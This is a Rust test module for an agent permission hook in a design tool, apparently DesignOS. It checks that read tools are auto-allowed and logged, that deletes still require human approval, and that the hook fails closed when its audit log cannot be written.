    fn hook_auto_allows_a_read_and_still_asks_for_a_delete() {
        let fx = Fixture::risky("tier");
        let read = serde_json::json!({
            "hook_event_name": "PermissionRequest",
            "tool_name": "mcp__designos__designos_get_document",
            "tool_input": {}
        });
        let out = fx.start(10_000, &read).wait_with_output().unwrap();
        let parsed: serde_json::Value = serde_json::from_slice(&out.stdout).expect("read auto-allow");
        assert_eq!(parsed["hookSpecificOutput"]["decision"]["behavior"], "allow");
        assert!(poll_approvals_in_dir(&fx.tab_dir, 1, 30).is_empty(), "a read must not leave a card request");

        let delete = serde_json::json!({
            "hook_event_name": "PermissionRequest",
            "tool_name": "mcp__designos__designos_delete_node",
            "tool_input": { "node_id": 3 }
        });
        let child = fx.start(10_000, &delete);
        let req = wait_for_request(&fx.tab_dir);
        assert_eq!(req.target, "node_id:3");
        assert!(!offer_session_grant(AgentPermissionMode::AskRisky, &req));
        write_scoped_approval_answer_in_dir(&fx.tab_dir, &req.id, ApprovalDecision::Allow, AnswerScope::Session).unwrap();
        let out = child.wait_with_output().unwrap();
        let parsed: serde_json::Value = serde_json::from_slice(&out.stdout).unwrap();
        assert_eq!(parsed["hookSpecificOutput"]["decision"]["behavior"], "allow");
        let mut store = GrantStore::default();
        settle_granted_requests(&mut store, "sess", &fx.tab_dir, &mut Vec::new(), 80);
        assert!(store.is_empty());
    }

    #[test]
    fn hook_rejects_a_malformed_scope_and_accepts_session_text() {
        let fx = Fixture::new("scope");
        for (body, allows) in [("allow nope", false), ("allow session", true), (r#"{"decision":"allow","scope":"forever"}"#, false)] {
            let payload = serde_json::json!({"tool_name": "Bash", "tool_input": {"command": "true"}});
            let child = fx.start(10_000, &payload);
            let req = wait_for_request(&fx.tab_dir);
            std::fs::write(fx.tab_dir.join(format!("{}.answer", req.id)), body).unwrap();
            let out = child.wait_with_output().unwrap();
            let text = String::from_utf8_lossy(&out.stdout);
            assert_eq!(text.contains("\"behavior\":\"allow\""), allows, "{body} -> {text}");
        }
    }

    #[test]
    fn fingerprint_uses_node_id_before_path() {
        let input = serde_json::json!({"node_id": 2, "path": "other.designos"});
        assert_eq!(fingerprint_from_tool_input(&input), "node_id:2");
        assert_eq!(canonical_target("path:file:///tmp//a/"), "path:/tmp/a");
        assert_eq!(canonical_target("node_id:2"), "node_id:2");
        assert_ne!(canonical_target("node_id:2"), canonical_target("node_id:3"));
    }

    #[test]
    fn hook_ask_risky_read_writes_an_auto_allow_row() {
        let fx = Fixture::risky("row-read");
        let path = auto_allow_log_path(&fx.session).expect("private log");
        assert!(!path.starts_with(&fx.session), "the log is outside the session folder: {}", path.display());
        assert!(!path_is_agent_temp(&path), "the log is outside temp: {}", path.display());
        let payload = serde_json::json!({
            "hook_event_name": "PermissionRequest",
            "tool_name": "mcp__designos__designos_get_document",
            "tool_input": { "node_id": 2 }
        });
        let out = fx.start(10_000, &payload).wait_with_output().unwrap();
        let text = String::from_utf8_lossy(&out.stdout);
        let parsed: serde_json::Value = serde_json::from_str(&text).unwrap_or_else(|err| panic!("{err}: {text} / {}", String::from_utf8_lossy(&out.stderr)));
        assert_eq!(parsed["hookSpecificOutput"]["decision"]["behavior"], "allow");
        let (rows, _) = load_auto_allow_log(&path);
        assert_eq!(rows.len(), 1, "a read auto-allow writes one row: {}", std::fs::read_to_string(&path).unwrap_or_default());
        assert_eq!(rows[0].reason, AutoAllowReason::Tier);
        assert_eq!(rows[0].tool_name, "designos_get_document");
        assert_eq!(rows[0].target, "node_id:2");
        assert_eq!(rows[0].kind, AutoAllowKind::Informational);
        assert!(rows[0].timestamp > 0);
    }

    #[test]
    fn hook_ask_risky_delete_writes_no_auto_allow_row() {
        let fx = Fixture::risky("row-delete");
        let path = auto_allow_log_path(&fx.session).expect("private log");
        let payload = serde_json::json!({
            "hook_event_name": "PermissionRequest",
            "tool_name": "mcp__designos__designos_delete_node",
            "tool_input": { "node_id": 3 }
        });
        let child = fx.start(10_000, &payload);
        let req = wait_for_request(&fx.tab_dir);
        assert_eq!(req.tool_name, "mcp__designos__designos_delete_node");
        withdraw_pending_requests_in_dir(&fx.tab_dir);
        let _ = child.wait_with_output();
        let (rows, _) = load_auto_allow_log(&path);
        assert!(rows.is_empty(), "a delete writes no auto-allow row: {rows:?}");
    }

    #[test]
    fn settle_on_a_tab_folder_logs_the_grant_on_the_session() {
        let fx = Fixture::new("grant-tab");
        let mut store = GrantStore::default();
        assert!(store.insert("sess", "designos_update_node", "node_id:2", 50));
        let mut pending = vec![ApprovalRequest {
            id: "granted".into(),
            tool_name: "mcp__designos__designos_update_node".into(),
            input_summary: "rename".into(),
            target: "node_id:2".into(),
            timestamp: 50,
        }];
        settle_granted_requests(&mut store, "sess", &fx.tab_dir, &mut pending, 60);
        assert!(pending.is_empty(), "the grant answers the request");
        let path = auto_allow_log_path(&fx.session).expect("private log");
        let (rows, _) = load_auto_allow_log(&path);
        assert_eq!(rows.len(), 1);
        assert_eq!(rows[0].reason, AutoAllowReason::Grant);
        assert_eq!(rows[0].tool_name, "designos_update_node");
        assert_eq!(rows[0].target, "node_id:2");
        assert_eq!(rows[0].timestamp, 60);
    }

    #[test]
    fn settle_granted_request_writes_a_grant_row() {
        let dir = std::env::temp_dir().join(format!("designos-1288-grant-row-{}", std::process::id()));
        let _ = std::fs::remove_dir_all(&dir);
        std::fs::create_dir_all(&dir).unwrap();
        let mut store = GrantStore::default();
        assert!(store.insert("sess", "designos_update_node", "node_id:2", 50));
        let mut pending = vec![ApprovalRequest {
            id: "granted".into(),
            tool_name: "mcp__designos__designos_update_node".into(),
            input_summary: "rename".into(),
            target: "node_id:2".into(),
            timestamp: 50,
        }];
        settle_granted_requests(&mut store, "sess", &dir, &mut pending, 60);
        assert!(pending.is_empty(), "the grant answers the request");
        let key = auto_allow_session_key(&dir);
        let path = auto_allow_log_path(&key).expect("private log");
        let (rows, _) = load_auto_allow_log(&path);
        assert_eq!(rows.len(), 1);
        assert_eq!(rows[0].reason, AutoAllowReason::Grant);
        assert_eq!(rows[0].tool_name, "designos_update_node");
        assert_eq!(rows[0].target, "node_id:2");
        assert_eq!(rows[0].kind, AutoAllowKind::Revertable);
        assert_eq!(rows[0].timestamp, 60);
        remove_auto_allow_log(&key);
        let _ = std::fs::remove_dir_all(&dir);
    }

    #[test]
    fn auto_allow_log_skips_a_malformed_line_and_drops_oldest_past_the_cap() {
        let dir = std::env::temp_dir().join(format!("designos-1288-log-cap-{}", std::process::id()));
        let _ = std::fs::remove_dir_all(&dir);
        std::fs::create_dir_all(&dir).unwrap();
        let path = prepare_auto_allow_log(&dir).expect("private log");
        let mut body = String::from("not-json\n{\"nope\":1}\n{\"dropped\":4}\n");
        body.push_str(&"x".repeat(AUTO_ALLOW_LINE_MAX + 8));
        body.push('\n');
        let written = AUTO_ALLOW_CAP + 2;
        for i in 0..written {
            body.push_str(&format!("{{\"ts\":{i},\"tool\":\"designos_get_document\",\"target\":\"\",\"reason\":\"tier\"}}\n"));
        }
        std::fs::write(&path, &body).unwrap();
        let (rows, dropped) = load_auto_allow_log(&path);
        assert_eq!(rows.len(), AUTO_ALLOW_CAP);
        assert_eq!(dropped, 4 + 2);
        assert_eq!(rows[0].timestamp, 2);
        assert_eq!(rows[0].kind, AutoAllowKind::Informational);
        assert!(rows.iter().all(|row| row.reason == AutoAllowReason::Tier));
        let raw = std::fs::read_to_string(&path).unwrap();
        assert!(raw.contains("not-json"), "the live file is append-only and keeps skipped lines");
        assert!(!raw.starts_with("{\"dropped\":"), "Studio never rewrites the live log");
        let mut log = AutoAllowLog::bind(&dir);
        assert!(log.poll().is_empty(), "a reader opened on an existing file starts at the end");
        append_auto_allow_row(&dir, "designos_get_app_state", "", AutoAllowReason::Tier, 9_000, None).unwrap();
        let got = log.poll();
        assert_eq!(got.len(), 1);
        assert_eq!(got[0].tool_name, "designos_get_app_state");
        assert_eq!(got[0].timestamp, 9_000);
        remove_auto_allow_log(&dir);
        let _ = std::fs::remove_dir_all(&dir);
    }

    #[test]
    fn risky_hook_omits_auto_allow_when_the_log_path_is_missing() {
        let script = approval_hook_script(std::path::Path::new("/tmp/designos-session"), None, true);
        assert!(!script.contains("designos_get_document"), "no auto-allow block: {script}");
        assert!(!script.contains("reason\":\"tier"), "no ledger append: {script}");
        assert_eq!(script.matches("\"behavior\":\"allow\"").count(), 1);
    }

    fn replace_log_with_directory(session_dir: &Path) -> PathBuf {
        let path = auto_allow_log_path(session_dir).expect("private log");
        let _ = std::fs::remove_file(&path);
        if let Some(parent) = path.parent() {
            std::fs::create_dir_all(parent).unwrap();
        }
        let _ = std::fs::remove_dir(&path);
        std::fs::create_dir(&path).expect("log path is a directory so append fails");
        path
    }

    #[test]
    fn hook_fails_closed_when_the_log_cannot_be_appended() {
        let fx = Fixture::risky("fail-closed");
        replace_log_with_directory(&fx.session);
        let payload = serde_json::json!({
            "hook_event_name": "PermissionRequest",
            "tool_name": "mcp__designos__designos_get_document",
            "tool_input": { "node_id": 2 }
        });
        let child = fx.start(10_000, &payload);
        let _req = wait_for_request(&fx.tab_dir);
        withdraw_pending_requests_in_dir(&fx.tab_dir);
        let out = child.wait_with_output().unwrap();
        let text = String::from_utf8_lossy(&out.stdout);
        assert!(!text.contains("\"behavior\":\"allow\""), "failed append must not auto-allow: {text}");
    }

    #[test]
    fn settle_leaves_the_request_when_the_grant_row_cannot_be_written() {
        let dir = std::env::temp_dir().join(format!("designos-1288-settle-fail-{}", crate::live_sync_tests::unique_tab_id()));
        let _ = std::fs::remove_dir_all(&dir);
        std::fs::create_dir_all(&dir).unwrap();
        replace_log_with_directory(&auto_allow_session_key(&dir));
        let mut store = GrantStore::default();
        assert!(store.insert("sess", "designos_update_node", "node_id:2", 50));
        let mut pending = vec![ApprovalRequest {
            id: "granted".into(),
            tool_name: "mcp__designos__designos_update_node".into(),
            input_summary: "rename".into(),
            target: "node_id:2".into(),
            timestamp: 50,
        }];
        settle_granted_requests(&mut store, "sess", &dir, &mut pending, 60);
        assert_eq!(pending.len(), 1, "an unwritable grant log leaves the request for the card");
        assert!(!dir.join("granted.answer").exists(), "no auto-answer without a grant row");
        remove_auto_allow_log(&auto_allow_session_key(&dir));
        let _ = std::fs::remove_dir_all(&dir);
    }

    #[test]
    fn auto_allow_log_keeps_every_concurrent_append() {
        let dir = std::env::temp_dir().join(format!("designos-1288-race-{}", crate::live_sync_tests::unique_tab_id()));
        let _ = std::fs::remove_dir_all(&dir);
        std::fs::create_dir_all(&dir).unwrap();
        let channel = crate::agent_approval_channel::prepare_channel_dir(&dir).expect("channel");
        let script = install_hook_script(&channel, None, true).expect("risky hook");
        let path = auto_allow_log_path(&dir).expect("private log");
        let seed = AUTO_ALLOW_CAP + 50;
        for i in 0..seed {
            append_auto_allow_row(&dir, "designos_get_document", &format!("s{i}"), AutoAllowReason::Tier, i as u64, None).unwrap();
        }
        let hook_procs = 8usize;
        let per_hook = 250usize;
        let rust_threads = 8usize;
        let per_thread = 250usize;
        let expected = seed + hook_procs * per_hook + rust_threads * per_thread;
        let stop = std::sync::Arc::new(std::sync::atomic::AtomicBool::new(false));
        let stop_trim = stop.clone();
        let trim_path = path.clone();
        let trim = std::thread::spawn(move || {
            let mut log = AutoAllowLog { path: Some(trim_path.clone()), offset: 0, skipping: false };
            while !stop_trim.load(std::sync::atomic::Ordering::Relaxed) {
                let _ = load_auto_allow_log(&trim_path);
                let _ = log.poll();
            }
            let _ = load_auto_allow_log(&trim_path);
        });
        let payload = serde_json::json!({
            "hook_event_name": "PermissionRequest",
            "tool_name": "mcp__designos__designos_get_document",
            "tool_input": { "node_id": 2 }
        })
        .to_string();
        let mut hooks = Vec::new();
        for _ in 0..hook_procs {
            let script = script.clone();
            let payload = payload.clone();
            hooks.push(std::thread::spawn(move || {
                for _ in 0..per_hook {
                    let mut child = Command::new("sh")
                        .arg(&script)
                        .env("DESIGNOS_TAB_ID", "7")
                        .stdin(Stdio::piped())
                        .stdout(Stdio::piped())
                        .stderr(Stdio::piped())
                        .spawn()
                        .unwrap();
                    child.stdin.take().unwrap().write_all(payload.as_bytes()).unwrap();
                    let out = child.wait_with_output().unwrap();
                    assert!(String::from_utf8_lossy(&out.stdout).contains("\"behavior\":\"allow\""), "{}", String::from_utf8_lossy(&out.stderr));
                }
            }));
        }
        let mut writers = Vec::new();
        for t in 0..rust_threads {
            let dir = dir.clone();
            writers.push(std::thread::spawn(move || {
                for i in 0..per_thread {
                    append_auto_allow_row(&dir, "designos_get_document", &format!("t{t}-{i}"), AutoAllowReason::Tier, 10_000 + i as u64, None).unwrap();
                }
            }));
        }
        for h in hooks {
            h.join().expect("hook appender");
        }
        for w in writers {
            w.join().expect("rust appender");
        }
        stop.store(true, std::sync::atomic::Ordering::Relaxed);
        trim.join().expect("trim");
        let (rows, dropped) = load_auto_allow_log(&path);
        assert_eq!(rows.len() as u64 + dropped, expected as u64, "rows={} dropped={dropped} expected={expected}", rows.len());
        assert_eq!(rows.len(), AUTO_ALLOW_CAP);
        remove_auto_allow_log(&dir);
        crate::agent_approval_channel::remove_channel(&dir);
        let _ = std::fs::remove_dir_all(&dir);
    }

    #[test]
    fn hook_tags_rows_with_the_tab_id_from_approvals_dir() {
        let fx = Fixture::risky("tab-row");
        let payload = serde_json::json!({
            "hook_event_name": "PermissionRequest",
            "tool_name": "mcp__designos__designos_get_document",
            "tool_input": { "node_id": 2 }
        });
        let out = fx.start(10_000, &payload).wait_with_output().unwrap();
        assert!(String::from_utf8_lossy(&out.stdout).contains("\"behavior\":\"allow\""));
        let path = auto_allow_log_path(&fx.session).expect("private log");
        let (rows, _) = load_auto_allow_log(&path);
        assert_eq!(rows.len(), 1);
        assert_eq!(rows[0].tab, Some(7));
    }
}

#[cfg(test)]
mod approval_channel_tests;
